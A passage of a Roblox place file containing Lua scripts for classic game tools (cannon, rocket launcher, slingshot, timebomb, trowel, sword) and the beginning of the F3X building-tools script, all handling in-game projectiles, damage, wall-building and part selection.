	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new("Part")

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 5)

	missile.Position = spawnPos
	missile.Size = Vector3.new(2,2,2)
	missile.Velocity = v * 200
	missile.BrickColor = BrickColor.random() -- BrickColor.new(26)
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = "Cannon Shot"
	missile.Elasticity = 1
	missile.Reflectance = .2
	missile.Friction = 0

	Tool.Handle.Boing:clone().Parent = missile
	

	
	local new_script = script.Parent.CannonBall:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace

end



Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit

	fire(lookAt)

	wait(2)

	Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)

]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX7AAFD0E7669C4C53992E2EB087A5AF66">
					<Properties>
						<string name="Name">RocketLauncher</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBXD6529C7A73CB4E29BF4DA033F95FEAEA">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">RocketScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[r = game:service("RunService")

shaft = script.Parent
position = shaft.Position

script.Parent.Explosion.PlayOnRemove = true -- play explosion sound when projectile removed from game

function fly()
	direction = shaft.CFrame.lookVector 
	position = position + direction
	error = position - shaft.Position
	shaft.Velocity = 7*error
end

function blow()
	swoosh:stop()
	explosion = Instance.new("Explosion")
	explosion.Position = shaft.Position


	-- find instigator tag
	local creator = script.Parent:findFirstChild("creator")
	if creator ~= nil then
		explosion.Hit:connect(function(part, distance)  onPlayerBlownUp(part, distance, creator) end)
	end

	explosion.Parent = game.Workspace
	connection:disconnect()
	wait(.1)
	shaft:remove()
end

function onPlayerBlownUp(part, distance, creator)
	
	if part.Name == "Head" then
	
		local humanoid = part.Parent.Humanoid
		tagHumanoid(humanoid, creator)
	end
end

function tagHumanoid(humanoid, creator)
	-- tag does not need to expire iff all explosions lethal
	
	if creator ~= nil then
		local new_tag = creator:clone()
		new_tag.Parent = humanoid
		
	end
end

function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
		
			tag.Parent = nil
		end
	end
end

t, s = r.Stepped:wait()

swoosh = script.Parent.Swoosh
swoosh:play()

d = t + 10.0 - s
connection = shaft.Touched:connect(blow)

while t < d do
	fly()
	t = r.Stepped:wait()
end

-- at max range
script.Parent.Explosion.PlayOnRemove = false
swoosh:stop()
shaft:remove()
]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX6C91B95EDB8345EE8B55C072287E0CFF">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Server Launcher</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[local Rocket = Instance.new("Part")
local Tool = script.Parent

Rocket.Locked = true
Rocket.BackSurface = 3
Rocket.BottomSurface = 3
Rocket.FrontSurface = 3
Rocket.LeftSurface = 3
Rocket.RightSurface = 3
Rocket.TopSurface = 3
Rocket.Size = Vector3.new(1,1,4)
Rocket.BrickColor = BrickColor.new(23)

Tool.RocketScript:clone().Parent = Rocket
Tool.Explosion:clone().Parent = Rocket
Tool.Swoosh:clone().Parent = Rocket


function fire(vTarget)

	local vCharacter = Tool.Parent;
	
	local vHandle = Tool:findFirstChild("Handle")
	if vHandle == nil then
		print("Handle not found")
		return 
	end

	local dir = vTarget - vHandle.Position

	dir = computeDirection(dir)

	local missile = Rocket:clone()

	local pos = vHandle.Position + (dir * 6)
	
	--missile.Position = pos
	missile.CFrame = CFrame.new(pos,  pos + dir)

	local creator_tag = Instance.new("ObjectValue")

	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	if vPlayer == nil then
		print("Player not found")
	else
		if (vPlayer.Neutral == false) then -- nice touch
			missile.BrickColor = vPlayer.TeamColor
		end
	end

	creator_tag.Value =vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = missile
	
	missile.RocketScript.Disabled = false

	missile.Parent = game.Workspace
end

function computeDirection(vec)
	local lenSquared = vec.magnitude * vec.magnitude
	local invSqrt = 1 / math.sqrt(lenSquared)
	return Vector3.new(vec.x * invSqrt, vec.y * invSqrt, vec.z * invSqrt)
end

Tool.Enabled = true
function onActivated()
	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint

	fire(targetPos)

	wait(7)

	Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)

]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX51B7F739AB92479EBC519DFDE790949B">
					<Properties>
						<string name="Name">Slingshot</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBXF4AC840F93314B459864E654E7C12738">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">PelletScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[local debris = game:service("Debris")
pellet = script.Parent
damage = 8

function onTouched(hit)
	humanoid = hit.Parent:findFirstChild("Humanoid")
	if humanoid~=nil then
		tagHumanoid(humanoid)
		humanoid:TakeDamage(damage)
	else
		damage = damage / 2
		if damage < 1 then
			connection:disconnect()
			pellet.Parent = nil
		end
	end
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = pellet:findFirstChild("creator")
	if tag ~= nil then
		-- kill all other tags
		while(humanoid:findFirstChild("creator") ~= nil) do
			humanoid:findFirstChild("creator").Parent = nil
		end

		local new_tag = tag:clone()
		new_tag.Parent = humanoid
		debris:AddItem(new_tag, 1)
	end
end

connection = pellet.Touched:connect(onTouched)

r = game:service("RunService")
t, s = r.Stepped:wait()
d = t + 2.0 - s
while t < d do
	t = r.Stepped:wait()
end

pellet.Parent = nil]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX95A54FFD9BDC49DD80A5631EE75DEABA">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Slingshot</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[Tool = script.Parent
VELOCITY = 85 -- constant

local Pellet = Instance.new("Part")
Pellet.Locked = true
Pellet.BackSurface = 0
Pellet.BottomSurface = 0
Pellet.FrontSurface = 0
Pellet.LeftSurface = 0
Pellet.RightSurface = 0
Pellet.TopSurface = 0
Pellet.Shape = 0
Pellet.Size = Vector3.new(1,1,1)
Pellet.BrickColor = BrickColor.new(2)
script.Parent.PelletScript:clone().Parent = Pellet

function fire(mouse_pos)


	Tool.Handle.SlingshotSound:play()

-- find player's head pos

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local head = vCharacter:findFirstChild("Head")
	if head == nil then return end

	local dir = mouse_pos - head.Position
	dir = computeDirection(dir)

	local launch = head.Position + 5 * dir

	local delta = mouse_pos - launch
	
	local dy = delta.y
	
	local new_delta = Vector3.new(delta.x, 0, delta.z)
	delta = new_delta

	local dx = delta.magnitude
	local unit_delta = delta.unit
	
	-- acceleration due to gravity in RBX units
	local g = (-9.81 * 20)

	local theta = computeLaunchAngle( dx, dy, g)

	local vy = math.sin(theta)
	local xz = math.cos(theta)
	local vx = unit_delta.x * xz
	local vz = unit_delta.z * xz
	

	local missile = Pellet:clone()
        

		

	missile.Position = launch
	missile.Velocity = Vector3.new(vx,vy,vz) * VELOCITY

	missile.PelletScript.Disabled = false

	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = missile
	
	missile.Parent = game.Workspace

end


function computeLaunchAngle(dx,dy,grav)
	-- arcane
	-- http://en.wikipedia.org/wiki/Trajectory_of_a_projectile
	
	local g = math.abs(grav)
	local inRoot = (VELOCITY*VELOCITY*VELOCITY*VELOCITY) - (g * ((g*dx*dx) + (2*dy*VELOCITY*VELOCITY)))
	if inRoot <= 0 then
		return .25 * math.pi
	end
	local root = math.sqrt(inRoot)
	local inATan1 = ((VELOCITY*VELOCITY) + root) / (g*dx)

	local inATan2 = ((VELOCITY*VELOCITY) - root) / (g*dx)
	local answer1 = math.atan(inATan1)
	local answer2 = math.atan(inATan2)
	if answer1 < answer2 then return answer1 end
	return answer2
end

function computeDirection(vec)
	local lenSquared = vec.magnitude * vec.magnitude
	local invSqrt = 1 / math.sqrt(lenSquared)
	return Vector3.new(vec.x * invSqrt, vec.y * invSqrt, vec.z * invSqrt)
end




Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint

	fire(targetPos)

	wait(.2)

	Tool.Enabled = true
end

script.Parent.Activated:connect(onActivated)


]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX7424C3976A15430185971C7EFAD2B3BD">
					<Properties>
						<string name="Name">Timebomb</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBX49409DCA7FFE4F9C81AC7202919CC21E">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Bomb</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[updateInterval = .4

currentColor = 1
colors = {26, 21} 

ticksound = Instance.new("Sound")
ticksound.SoundId = "rbxasset://sounds\\clickfast.wav"
ticksound.Parent = script.Parent

function update()
	updateInterval = updateInterval * .9

	script.Parent.BrickColor = BrickColor.new(colors[currentColor])
	currentColor = currentColor + 1
	if (currentColor > 2) then currentColor = 1 end
end


function blowUp()
	local sound = Instance.new("Sound")
		sound.SoundId = "rbxasset://sounds\\Rocket shot.wav"
		sound.Parent = script.Parent
		sound.Volume = 1
		sound:play()
	explosion = Instance.new("Explosion")
	explosion.BlastRadius = 12
	explosion.BlastPressure = 1000000 -- these are really wussy units

	-- find instigator tag
	local creator = script.Parent:findFirstChild("creator")
	if creator ~= nil then
		explosion.Hit:connect(function(part, distance)  onPlayerBlownUp(part, distance, creator) end)
	end

	explosion.Position = script.Parent.Position
	explosion.Parent = game.Workspace
	script.Parent.Transparency = 1
end

function onPlayerBlownUp(part, distance, creator)
	if part.Name == "Head" then
		local humanoid = part.Parent.Humanoid
		tagHumanoid(humanoid, creator)
	end
end

function tagHumanoid(humanoid, creator)
	-- tag does not need to expire iff all explosions lethal
	
	if creator ~= nil then
		local new_tag = creator:clone()
		new_tag.Parent = humanoid
	end
end

function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

while updateInterval > .1 do
	wait(updateInterval)
	update()

	
	ticksound:play()
	
end

blowUp()
wait(2)
script.Parent:remove()
]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX9AF9BCD66BC24F0CBAD6FB87A13E0B73">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">PlantBomb</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[bombScript = script.Parent.Bomb
Tool = script.Parent

function plant()
	local bomb = Instance.new("Part")
   
	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local spawnPos = vCharacter.PrimaryPart.Position


	bomb.Position = Vector3.new(spawnPos.x, spawnPos.y+3, spawnPos.z)
	bomb.Size = Vector3.new(2,2,2)
	
	bomb.BrickColor = BrickColor.new(21)
	bomb.Shape = 0
	bomb.BottomSurface = 0
	bomb.TopSurface = 0
	bomb.Reflectance = 1
	bomb.Name = "TimeBomb"
	bomb.Locked = true

	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = bomb

	bomb.Parent = game.Workspace
	local new_script = bombScript:clone()
	new_script.Disabled = false
	new_script.Parent = bomb

end


Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint

	plant()

	wait(6)

	Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBXBE0FB9BACB534EE4B6D3799C7F131253">
					<Properties>
						<string name="Name">Trowel</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBX02D54E7841304609A6DD4D17286343E0">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">WallMaker</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[wallWidth = 12
wallHeight = 4
brickSpeed = 0.04

local Tool = script.Parent


-- places a brick at pos and returns the position of the brick's opposite corner
function placeBrick(cf, pos, color)
	local brick = Instance.new("Part")
	brick.BrickColor = color
	brick.CFrame = cf * CFrame.new(pos + brick.size / 2)
	script.Parent.BrickCleanup:clone().Parent = brick -- attach cleanup script to this brick
	brick.BrickCleanup.Disabled = false
	brick.Parent = game.Workspace
	brick:makeJoints()
	return  brick, pos +  brick.size
end

function buildWall(cf)

	local color = BrickColor.random()
	local bricks = {}

	assert(wallWidth>0)
	local y = 0
	while y < wallHeight do
		local p
		local x = -wallWidth/2
		while x < wallWidth/2 do
			local brick
			brick, p = placeBrick(cf, Vector3.new(x, y, 0), color)
			x = p.x
			table.insert(bricks, brick)
			wait(brickSpeed)
		end
		y = p.y
	end

	return bricks

end


function snap(v)
	if math.abs(v.x)>math.abs(v.z) then
		if v.x>0 then
			return Vector3.new(1,0,0)
		else
			return Vector3.new(-1,0,0)
		end
	else
		if v.z>0 then
			return Vector3.new(0,0,1)
		else
			return Vector3.new(0,0,-1)
		end
	end
end


Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = snap( (targetPos - character.Head.Position).unit )
	local cf = CFrame.new(targetPos, targetPos + lookAt)

	Tool.Handle.BuildSound:play()

	buildWall(cf)

	wait(5)

	Tool.Enabled = true
end

script.Parent.Activated:connect(onActivated)

]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX2694F51AC09047C8AE7F1254D4893766">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">BrickCleanup</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[-- this script removes its parent from the workspace after 24 seconds

while true do
wait(24)
if script.Parent.Name == "Trowel" then return end -- so the tool itself isn't removed
script.Parent.Parent = nil
end ]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBXB109498FC38D48C593029C8CFAB9BF55">
					<Properties>
						<string name="Name">Sword</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBX1A12E5F3B6224B3F9410FE696BBEC64D">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">SwordScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[-------- OMG HAX

r = game:service("RunService")


local damage = 5


local slash_damage = 10
local lunge_damage = 30

sword = script.Parent.Handle
Tool = script.Parent


local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Parent = sword
SlashSound.Volume = .7

local LungeSound = Instance.new("Sound")
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Parent = sword
LungeSound.Volume = .6

local UnsheathSound = Instance.new("Sound")
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Parent = sword
UnsheathSound.Volume = 1


function blow(hit)
	if (hit.Parent == nil) then return end -- happens when bullet hits sword

	local humanoid = hit.Parent:findFirstChild("Humanoid")
	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)
	local hum = vCharacter:findFirstChild("Humanoid") -- non-nil if tool held by a character
	if humanoid~=nil and humanoid ~= hum and hum ~= nil then
		-- final check, make sure sword is in-hand

		local right_arm = vCharacter:FindFirstChild("Right Arm")
		if (right_arm ~= nil) then
			local joint = right_arm:FindFirstChild("RightGrip")
			if (joint ~= nil and (joint.Part0 == sword or joint.Part1 == sword)) then
				tagHumanoid(humanoid, vPlayer)
				humanoid:TakeDamage(damage)
				wait(1)
				untagHumanoid(humanoid)
			end
		end


	end
end


function tagHumanoid(humanoid, player)
	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = player
	creator_tag.Name = "creator"
	creator_tag.Parent = humanoid
end

function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end


function attack()
	damage = slash_damage
	SlashSound:play()
	local anim = Instance.new("StringValue")
	anim.Name = "toolanim"
	anim.Value = "Slash"
	anim.Parent = Tool
end

function lunge()
	damage = lunge_damage

	LungeSound:play()

	local anim = Instance.new("StringValue")
	anim.Name = "toolanim"
	anim.Value = "Lunge"
	anim.Parent = Tool
	
	
	force = Instance.new("BodyVelocity")
	force.velocity = Vector3.new(0,10,0) --Tool.Parent.Torso.CFrame.lookVector * 80
	force.Parent = Tool.Parent.Torso
	wait(.25)
	swordOut()
	wait(.25)
	force.Parent = nil
	wait(.5)
	swordUp()

	damage = slash_damage
end

function swordUp()
	Tool.GripForward = Vector3.new(-1,0,0)
	Tool.GripRight = Vector3.new(0,1,0)
	Tool.GripUp = Vector3.new(0,0,1)
end

function swordOut()
	Tool.GripForward = Vector3.new(0,0,1)
	Tool.GripRight = Vector3.new(0,-1,0)
	Tool.GripUp = Vector3.new(-1,0,0)
end

function swordAcross()
	-- parry
end


Tool.Enabled = true
local last_attack = 0
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	t = r.Stepped:wait()

	if (t - last_attack < .2) then
		lunge()
	else
		attack()
	end

	last_attack = t

	--wait(.5)

	Tool.Enabled = true
end


function onEquipped()
	UnsheathSound:play()
end


script.Parent.Activated:connect(onActivated)
script.Parent.Equipped:connect(onEquipped)


connection = sword.Touched:connect(blow)


]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBXED7FB4D153784281BD89F69FABC654AE">
					<Properties>
						<string name="Name">F3X Building Tools</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="LocalScript" referent="RBXBD71D50C2DE04D089F737C03CE907818">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Building Tools by F3X</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[------------------------------------------
-- Create references to important objects
------------------------------------------
Services = {
	Workspace			= Game:GetService 'Workspace';
	Players				= Game:GetService 'Players';
	Debris				= Game:GetService 'Debris';
	MarketplaceService	= Game:GetService 'MarketplaceService';
	ContentProvider		= Game:GetService 'ContentProvider';
	SoundService		= Game:GetService 'SoundService';
	UserInputService	= Game:GetService 'UserInputService';
	TestService			= Game:GetService 'TestService';
	Selection			= Game:GetService 'Selection';
	CoreGui				= Game:GetService 'CoreGui';
	HttpService			= Game:GetService 'HttpService';
	JointsService		= Game.JointsService;
};

Assets = {
	DarkSlantedRectangle	= 'http://www.mulrbx.com/asset/?id=127774197';
	LightSlantedRectangle	= 'http://www.mulrbx.com/asset/?id=127772502';
	ActionCompletionSound	= 'http://www.mulrbx.com/asset/?id=99666917';
	ExpandArrow				= 'http://www.mulrbx.com/asset/?id=134367382';
	UndoActiveDecal			= 'http://www.mulrbx.com/asset/?id=141741408';
	UndoInactiveDecal		= 'http://www.mulrbx.com/asset/?id=142074557';
	RedoActiveDecal			= 'http://www.mulrbx.com/asset/?id=141741327';
	RedoInactiveDecal		= 'http://www.mulrbx.com/asset/?id=142074553';
	DeleteActiveDecal		= 'http://www.mulrbx.com/asset/?id=141896298';
	DeleteInactiveDecal		= 'http://www.mulrbx.com/asset/?id=142074644';
	ExportActiveDecal		= 'http://www.mulrbx.com/asset/?id=141741337';
	ExportInactiveDecal		= 'http://www.mulrbx.com/asset/?id=142074569';
	CloneActiveDecal		= 'http://www.mulrbx.com/asset/?id=142073926';
	CloneInactiveDecal		= 'http://www.mulrbx.com/asset/?id=142074563';
	PluginIcon				= 'http://www.mulrbx.com/asset/?id=142287521';
	GroupLockIcon			= 'http://www.mulrbx.com/asset/?id=175396862';
	GroupUnlockIcon			= 'http://www.mulrbx.com/asset/?id=160408836';
	GroupUpdateOKIcon		= 'http://www.mulrbx.com/asset/?id=164421681';
	GroupUpdateIcon			= 'http://www.mulrbx.com/asset/?id=160402908';
};

-- The ID of the tool model on ROBLOX
ToolAssetID = 142785488;

Tool = script.Parent;
Player = Services.Players.LocalPlayer;
Mouse = nil;

-- Set tool or plugin-specific references
if plugin then
	ToolType		= 'plugin';
	GUIContainer	= Services.CoreGui;

	-- Create the toolbar button
	ToolbarButton = plugin:CreateToolbar( 'Building Tools by F3X' ):CreateButton( '', 'Building Tools by F3X', Assets.PluginIcon );

	-- Initiate a server only if not in solo testing mode
	-- (checked in a potentially unreliable way)
	wait( 3 );
	if Services.Players.NumPlayers == 0 then
		Game:GetService 'NetworkServer';
	end;
elseif Tool:IsA 'Tool' then
	ToolType		= 'tool';
	GUIContainer	= Player:WaitForChild 'PlayerGui';
end;

------------------------------------------
-- Load external dependencies
------------------------------------------

RbxUtility = LoadLibrary 'RbxUtility';

-- Preload external assets
for ResourceName, ResourceUrl in pairs( Assets ) do
	Services.ContentProvider:Preload( ResourceUrl );
end;

repeat wait( 0 ) until _G.gloo;
Gloo = _G.gloo;

Tool:WaitForChild 'HttpInterface';
Tool:WaitForChild 'Interfaces';

------------------------------------------
-- Define functions that are depended-upon
------------------------------------------
function _findTableOccurrences( haystack, needle )
	-- Returns the positions of instances of `needle` in table `haystack`
	local positions = {};

	-- Add any indexes from `haystack` that have `needle`
	for index, value in pairs( haystack ) do
		if value == needle then
			table.insert( positions, index );
		end;
	end;

	return positions;
end;

function _getCollectionInfo( part_collection )
	-- Returns the size and position of collection of parts `part_collection`

	-- Get the corners
	local corners = {};

	-- Create shortcuts to certain things that are expensive to call constantly
	-- (note: otherwise it actually becomes an issue if the selection grows
	-- considerably large)
	local table_insert = table.insert;
	local newCFrame = CFrame.new;

	for _, Part in pairs( part_collection ) do

		local PartCFrame = Part.CFrame;
		local partCFrameOffset = PartCFrame.toWorldSpace;
		local PartSize = Part.Size / 2;
		local size_x, size_y, size_z = PartSize.x, PartSize.y, PartSize.z;

		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( size_x, size_y, size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( -size_x, size_y, size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( size_x, -size_y, size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( size_x, size_y, -size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( -size_x, size_y, -size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( -size_x, -size_y, size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( size_x, -size_y, -size_z ) ) );
		table_insert( corners, partCFrameOffset( PartCFrame, newCFrame( -size_x, -size_y, -size_z ) ) );

	end;

	-- Get the extents
	local x, y, z = {}, {}, {};

	for _, Corner in pairs( corners ) do
		table_insert( x, Corner.x );
		table_insert( y, Corner.y );
		table_insert( z, Corner.z );
	end;

	local x_min, y_min, z_min = math.min( unpack( x ) ),
								math.min( unpack( y ) ),
								math.min( unpack( z ) );

	local x_max, y_max, z_max = math.max( unpack( x ) ),
								math.max( unpack( y ) ),
								math.max( unpack( z ) );

	-- Get the size between the extents
	local x_size, y_size, z_size = 	x_max - x_min,
									y_max - y_min,
									z_max - z_min;

	local Size = Vector3.new( x_size, y_size, z_size );

	-- Get the centroid of the collection of points
	local Position = CFrame.new( 	x_min + ( x_max - x_min ) / 2,
									y_min + ( y_max - y_min ) / 2,
									z_min + ( z_max - z_min ) / 2 );

	-- Return the size of the collection of parts
	return Size, Position;
end;

function _round( number, places )
	-- Returns `number` rounded to the number of decimal `places`
	-- (from lua-users)

	local mult = 10 ^ ( places or 0 );

	return math.floor( number * mult + 0.5 ) / mult;

end

function _cloneTable( source )
	-- Returns a deep copy of table `source`

	-- Get a copy of `source`'s metatable, since the hacky method
	-- we're using to copy the table doesn't include its metatable
	local source_mt = getmetatable( source );

	-- Return a copy of `source` including its metatable
	return setmetatable( { unpack( source ) }, source_mt );
end;

function _getAllDescendants( Parent )
	-- Recursively gets all the descendants of  `Parent` and returns them

	local descendants = {};

	for _, Child in pairs( Parent:GetChildren() ) do

		-- Add the direct descendants of `Parent`
		table.insert( descendants, Child );

		-- Add the descendants of each child
		for _, Subchild in pairs( _getAllDescendants( Child ) ) do
			table.insert( descendants, Subchild );
		end;

	end;

	return descendants;

end;

function _pointToScreenSpace( Point )
	-- Returns Vector3 `Point`'s position on the screen when rendered
	-- (kudos to stravant for this)

	local point = Services.Workspace.CurrentCamera.CoordinateFrame:pointToObjectSpace( Point );
	local aspectRatio = Mouse.ViewSizeX / Mouse.ViewSizeY;
	local hfactor = math.tan( math.rad( Services.Workspace.CurrentCamera.FieldOfView ) / 2 )
	local wfactor = aspectRatio * hfactor;

	local x = ( point.x / point.z ) / -wfactor;
	local y = ( point.y / point.z ) /  hfactor;

	local screen_pos = Vector2.new( Mouse.ViewSizeX * ( 0.5 + 0.5 * x ), Mouse.ViewSizeY * ( 0.5 + 0.5 * y ) );
	if ( screen_pos.x < 0 or screen_pos.x > Mouse.ViewSizeX ) or ( screen_pos.y < 0 or screen_pos.y > Mouse.ViewSizeY ) then
		return nil;
	end;
	if Services.Workspace.CurrentCamera.CoordinateFrame:toObjectSpace( CFrame.new( Point ) ).z > 0 then
		return nil;
	end;

	return screen_pos;

end;

function _cloneParts( parts )
	-- Returns a table of cloned `parts`

	local new_parts = {};

	-- Copy the parts into `new_parts`
	for part_index, Part in pairs( parts ) do
		new_parts[part_index] = Part:Clone();
	end;

	return new_parts;
end;

function _replaceParts( old_parts, new_parts )
	-- Removes `old_parts` and inserts `new_parts`

	-- Remove old parts
	for _, OldPart in pairs( old_parts ) do
		OldPart.Parent = nil;
	end;

	-- Insert `new_parts
	for _, NewPart in pairs( new_parts ) do
		NewPart.Parent = Services.Workspace;
		NewPart:MakeJoints();
	end;

end;

function _splitString( str, delimiter )
	-- Returns a table of string `str` split by pattern `delimiter`

	local parts = {};
	local pattern = ( "([^%s]+)" ):format( delimiter );

	str:gsub( pattern, function ( part )
		table.insert( parts, part );
	end );

	return parts;
end;

function _generateSerializationID()
	-- Returns a random 5-character string
	-- with characters A-Z, a-z, and 0-9
	-- (there are 916,132,832 unique IDs)

	local characters = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
		"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
		"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };

	local serialization_id = "";

	-- Pick out 5 random characters
	for _ = 1, 5 do
		serialization_id = serialization_id .. ( characters[math.random( #characters )] );
	end;

	return serialization_id;
end;

function _splitNumberListString( str )
	-- Returns the contents of _splitString( str, ", " ), except
	-- each value in the table is turned into a number

	-- Get the number strings
	local numbers = _splitString( str, ", " );

	-- Turn them into numbers
	for number_index, number in pairs( numbers ) do
		numbers[number_index] = tonumber( number );
	end;

	-- Return `numbers`
	return numbers;
end;

function _getSerializationPartType( Part )
	-- Returns a special number that determines the type of
	-- part `Part` is

	local Types = {
		Normal = 1,
		Truss = 2,
		Wedge = 3,
		Corner = 4,
		Cylinder = 5,
		Ball = 6,
		Seat = 7,
		VehicleSeat = 8,
		Spawn = 9
	};

	-- Return the appropriate type number
	if Part.ClassName == "Part" then
		if Part.Shape == Enum.PartType.Block then
			return Types.Normal;
		elseif Part.Shape == Enum.PartType.Cylinder then
			return Types.Cylinder;
		elseif Part.Shape == Enum.PartType.Ball then
			return Types.Ball;
		end;

	elseif Part.ClassName == "Seat" then
		return Types.Seat;

	elseif Part.ClassName == "VehicleSeat" then
		return Types.VehicleSeat;

